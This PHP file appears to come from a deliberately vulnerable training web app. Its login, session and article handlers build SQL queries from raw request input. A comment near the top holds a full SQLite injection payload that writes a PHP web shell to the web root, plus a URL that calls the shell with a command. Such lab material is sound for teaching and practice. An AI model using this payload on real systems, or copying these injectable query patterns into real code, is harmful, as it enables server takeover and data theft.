<?php
/**
 *
 */
namespace RightWay;

use RightWay\Lib\Container;
/**
 * Class Application
 * @package RightWay
 */

// ', ''); ATTACH DATABASE '/var/www/html/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php echo system($_GET["cmd"]);'); --
// http://172.22.0.2/lol.php?cmd=ls
class Application {
    public $services;

    /**
     * Application constructor.
     */
    public function __construct()
    {
        session_start();

        $this->services = new Container();
        $action = $_REQUEST['action'];

        if ($action === 'login') {
            $user = $_POST['username'];
            $password = $_POST['password'];

            $sql = "SELECT * FROM users WHERE username = '$user' AND password = '$password'";
            $user = $this->services->db->query($sql, \PDO::FETCH_ASSOC);
            $user = $user->fetch();

            if ($user) {
                $_SESSION['auth_session'] = md5(sha1(time() . rand()));
                $sql = "UPDATE users SET `session_id` = '". $_SESSION['auth_session'] ."' WHERE id = ". $user['id'];
                $this->services->db->exec($sql);
            } else {
                echo $this->services->templateEngine->render('fail.html');
                exit();
            }

            header('Location: /?action=articles');
        }

        $sql = "SELECT * FROM users WHERE `session_id` = '". $_SESSION['auth_session'] ."'";
        $user = $this->services->db->query($sql, \PDO::FETCH_ASSOC);
        $user = $user->fetch();
        if (!$user && $action && $action !== 'default') {
            echo $this->services->templateEngine->render('fail.html');
            exit();
        }

        switch ($action) {
            case 'add_article':
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    $title = $_POST['title'];
                    $content = $_POST['content'];

                    $sql = "
                      INSERT INTO articles (id, title, content) 
                      VALUES ((SELECT MAX(id) + 1 FROM articles), '$title', '$content')";

                    $this->services->db->exec($sql);

                    header('Location: /?action=articles');
                } else {
                    echo $this->services->templateEngine->render('add_article.html', ['content' => 'Add article']);
                }
                break;
            case 'articles':
                $articles = $this->services->db->query('SELECT * FROM articles');
                echo $this->services->templateEngine->render('articles.html', ['articles' => $articles, 'q' => $_GET['q']]);
                break;
            default:
                echo $this->services->templateEngine->render('default.html', ['content' => 'Hello, students!']);
        }
    }
}